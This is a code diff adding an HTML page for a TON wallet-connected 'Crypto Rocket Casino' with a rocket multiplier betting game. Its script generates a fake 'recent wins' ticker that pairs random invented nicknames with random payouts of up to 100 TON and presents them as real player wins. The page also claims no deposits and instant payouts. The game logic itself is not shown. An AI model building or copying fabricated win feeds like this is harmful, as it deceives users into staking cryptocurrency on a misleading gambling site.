@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Rocket Casino</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Cinzel+Decorative:wght@700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: white;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            position: relative;
+            background-image: url('casino-background.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        #ton-connect {
+            margin-bottom: 20px;
+        }
+        button {
+            background: linear-gradient(45deg, #ffd700, #ff8c00);
+            color: #0a0a0a;
+            font-size: 24px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            font-family: 'Cinzel Decorative', cursive;
+            text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.9);
+        }
+        .claim-button, .play-button {
+            margin-top: 20px;
+        }
+        #wallet-info, #game-info {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffd700;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+        }
+        input {
+            font-size: 16px;
+            padding: 10px;
+            width: 150px;
+            margin: 10px 0;
+            text-align: center;
+            border: 2px solid #ffd700;
+            border-radius: 5px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            font-family: 'Roboto', sans-serif;
+        }
+        .game-container {
+            width: 300px;
+            height: 300px;
+            position: relative;
+            overflow: hidden;
+            background-color: black;
+            border-radius: 10px;
+            margin-top: 20px;
+            background-image: url('logo2.png');
+            background-size: cover;
+            background-position: center;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.7);
+            border: 2px solid #ffd700;
+        }
+        .rocket {
+            width: 90px;
+            height: 90px;
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .falling-star {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+        }
+        /* Декоративные элементы */
+        .decorative-lights {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.2) 10%, transparent 10.01%);
+            background-size: 20px 20px;
+            animation: lights 2s linear infinite;
+        }
+        @keyframes lights {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-20px); }
+        }
+        .casino-border {
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            border: 3px solid #ffd700;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            pointer-events: none;
+        }
+        #greeting {
+            font-size: 48px;
+            font-family: 'Cinzel Decorative', cursive;
+            color: #ffd700;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        #subtitle {
+            font-size: 16px;
+            color: #ffd700;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+            margin-bottom: 20px;
+            text-align: center;
+            font-family: 'Roboto', sans-serif;
+            opacity: 0.9;
+        }
+        /* Анимация неонового свечения */
+        @keyframes neon-glow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        .neon-text {
+            animation: neon-glow 1.5s infinite alternate;
+        }
+        /* Фоновые элементы */
+        .background-elements {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+        .background-elements::before, .background-elements::after {
+            content: '';
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.3), transparent);
+            border-radius: 50%;
+            animation: float 10s infinite linear;
+        }
+        .background-elements::before {
+            top: 10%;
+            left: 10%;
+            animation-duration: 12s;
+        }
+        .background-elements::after {
+            top: 60%;
+            left: 70%;
+            animation-duration: 15s;
+        }
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+        /* Анимация логотипов TON */
+        .ton-logo {
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            opacity: 0.5;
+            animation: rise 10s linear infinite;
+            bottom: -70px; /* Начинаем движение с самого низа */
+        }
+        @keyframes rise {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(calc(-100vh - 70px)); } /* Поднимаем до самого верха */
+        }
+        /* Блок с выигрышами */
+        #wins-container {
+            margin-top: 10px;
+            font-size: 18px;
+            color: #ffd700;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+            text-align: center;
+            font-family: 'Roboto', sans-serif;
+            opacity: 0.9;
+            height: 30px; /* Фиксированная высота для одного сообщения */
+            overflow: hidden;
+        }
+        .win-message {
+            margin: 5px 0;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background-elements"></div>
+
+    <div id="greeting" class="neon-text">Crypto Rocket Casino</div>
+    <div id="subtitle">No deposits! Instant payouts to your wallet.<br>The world's first On-Chain casino.</div>
+
+    <div id="ton-connect"></div>
+
+    <input type="number" id="betAmount" placeholder="Bet (TON)" min="1" />
+
+    <div id="wins-container"></div> <!-- Контейнер для выигрышей -->
+
+    <button onclick="startGame();" class="play-button">Play</button>
+
+    <div id="game-info">Multiplier: <span id="multiplier">1.00</span>x</div>
+    <div id="wallet-info">Balance: <span id="wallet-balance">0.00</span> TON</div>
+
+    <div class="game-container">
+        <div class="decorative-lights"></div>
+        <div class="casino-border"></div>
+        <div id="stars-container"></div>
+        <img src="logo1.png" class="rocket" id="rocket">
+    </div>
+
+    <button onclick="stopGame();" class="claim-button">Stop</button>
+
+    <script src="tonsdk.js"></script>
+
+    <script>
+        // Переменная для отслеживания количества логотипов на экране
+        let tonLogosCount = 0;
+        const maxTonLogos = 7; // Максимальное количество логотипов
+
+        // Функция для создания логотипов TON
+        function createTonLogo() {
+            if (tonLogosCount >= maxTonLogos) return; // Не создаем новые, если уже есть 7
+
+            const tonLogo = document.createElement('img');
+            tonLogo.src = 'ton_logo.png';
+            tonLogo.classList.add('ton-logo');
+
+            // Рассчитываем случайную позицию по горизонтали с учетом ширины логотипа
+            const maxLeft = window.innerWidth - 70; // Ширина экрана минус ширина логотипа
+            const randomLeft = Math.random() * maxLeft; // Случайная позиция в пределах экрана
+            tonLogo.style.left = `${randomLeft}px`;
+
+            tonLogo.style.animationDuration = `${Math.random() * 10 + 5}s`; // Случайная скорость
+            document.body.appendChild(tonLogo);
+
+            tonLogosCount++; // Увеличиваем счетчик
+
+            // Удаляем логотип после завершения анимации
+            tonLogo.addEventListener('animationend', () => {
+                tonLogo.remove();
+                tonLogosCount--; // Уменьшаем счетчик
+            });
+        }
+
+        // Запускаем создание логотипов каждые 2 секунды
+        setInterval(createTonLogo, 2000);
+
+        // Функция для генерации случайного никнейма
+        function generateRandomNickname() {
+            const words = [
+                'animus', 'crypto', 'ton', 'rocket', 'winner', 'lucky', 'pro', 'master', 'shadow', 'nova', 
+                'draco', 'photon', 'wolf', 'phoenix', 'dragon', 'eagle', 'tiger', 'lion', 'ninja', 'horizon', 
+                'storm', 'cosmos', 'vortex', 'nebula', 'matrix', 'alpha', 'spectre', 'quantum', 'reaper', 
+                'beacon', 'thunder', 'valor', 'ember', 'blaze', 'crimson', 'frost', 'spartan', 'viper', 'glory', 
+                'flame', 'breeze', 'fury', 'echo', 'pulse', 'hawk', 'atlas', 'vanguard', 'guardian', 'nightmare',
+                'tornado', 'cyclone', 'stealth', 'nova', 'void', 'phantom', 'raven'
+            ];
+
+            const suffixes = [
+                '123', 'x', '007', 'vip', '777', 'og', 'max', 'king', 'alpha', 'beta', 'omega', 'ace', 'hero', 
+                'wizard', 'force', 'core', 'prime', 'elite', 'shadow', 'master', 'champ', 'boss', 'legend', 
+                'kingpin', 'champion', 'zero', 'one', 'two', 'v', 'ii', 'iii', '00', 'extreme', 'stealth', 'edge', 
+                'nova', 'radar', 'maverick', 'strike', 'titan', 'clash', 'blitz', 'phantom', 'reaper', 'vanguard', 
+                'genesis', 'wraith', 'void', 'alpha', 'omega', 'thunder', 'legacy', 'enigma', 'beacon', 'circuit', 
+                'scout', 'vortex', 'storm', 'legendary', 'tactical', 'inferno', 'eagle', 'iron', 'celestial', 
+                'apex', 'pulse', 'orbital', 'blaze', 'fusion'
+            ];
+
+            // Случайно генерируем слово и суффикс
+            const randomWord = words[Math.floor(Math.random() * words.length)];
+            const randomSuffix = suffixes[Math.floor(Math.random() * suffixes.length)];
+
+            // Генерация случайных чисел и букв для добавления случайности
+            const randomNumber = Math.floor(Math.random() * 1000); // Число от 0 до 999
+            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26)); // Случайная буква
+
+            // Формируем массив из частей и случайным образом перемешиваем их
+            const parts = [randomWord, randomNumber, randomChar, randomSuffix];
+            parts.sort(() => Math.random() - 0.5); // Случайное перемешивание массива
+
+            // Формируем финальное имя в формате "@часть1часть2часть3"
+            const randomNickname = `@${parts.join('')}`;
+
+            return randomNickname;
+        }
+
+        // Функция для генерации случайного выигрыша
+        function generateRandomWin() {
+            return (Math.random() * (100 - 0.1) + 0.1).toFixed(2); // От 0.1 до 100 TON
+        }
+
+        // Функция для добавления сообщения о выигрыше
+        function addWinMessage() {
+            const winsContainer = document.getElementById('wins-container');
+            winsContainer.innerHTML = ''; // Очищаем контейнер перед добавлением нового сообщения
+
+            const winMessage = document.createElement('div');
+            winMessage.classList.add('win-message');
+            winMessage.textContent = `${generateRandomNickname()} won ${generateRandomWin()} TON!`;
+            winsContainer.appendChild(winMessage);
+        }
+
+        // Запускаем генерацию сообщений о выигрышах
+        function startWinMessages() {
+            const delay = Math.random() * (5000 - 2000) + 2000; // От 2 до 5 секунд
+            setTimeout(() => {
+                addWinMessage();
+                startWinMessages(); // Рекурсивно запускаем следующее сообщение
+            }, delay);
+        }
+
+        // Начинаем показ выигрышей
+        startWinMessages();
+    </script>
+
+</body>
+</html>
